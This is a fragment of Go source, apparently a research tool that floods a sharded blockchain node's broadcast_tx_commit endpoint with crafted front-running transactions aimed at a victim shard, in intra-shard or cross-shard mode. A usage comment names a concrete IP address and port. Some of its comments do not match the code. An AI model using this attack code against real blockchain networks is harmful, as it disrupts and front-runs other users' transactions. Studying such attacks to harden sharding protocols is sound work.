...
// ./build/byshardlatency -shardport "20157" -shardip "18.188.221.188"
...
func main() {
	...
	if isIntra == 1 { // attack with intra-shard front-running txs
		for i := uint(0); i < attackNum; i++ { // value: trace victim transactions
			http.Get(fmt.Sprintf("http://%v:%v/broadcast_tx_commit?tx=\"fromid=%v,toid=%v,type=%v,from=VCTM,to=INTR,value=%v,data=NONE,nonce=%v\"", shardIp, shardPort, victimShard, targetShard, 1, i, nonce))
		}
	} else { // attack with intra-shard front-running txs
		for i := uint(0); i < attackNum; i++ { // value: trace victim transactions
			http.Get(fmt.Sprintf("http://%v:%v/broadcast_tx_commit?tx=\"fromid=%v,toid=%v,type=%v,from=VCTM,to=CROS,value=%v,data=NONE,nonce=%v\"", shardIp, shardPort, victimShard, targetShard, 1, i, nonce))
		}
	}
}
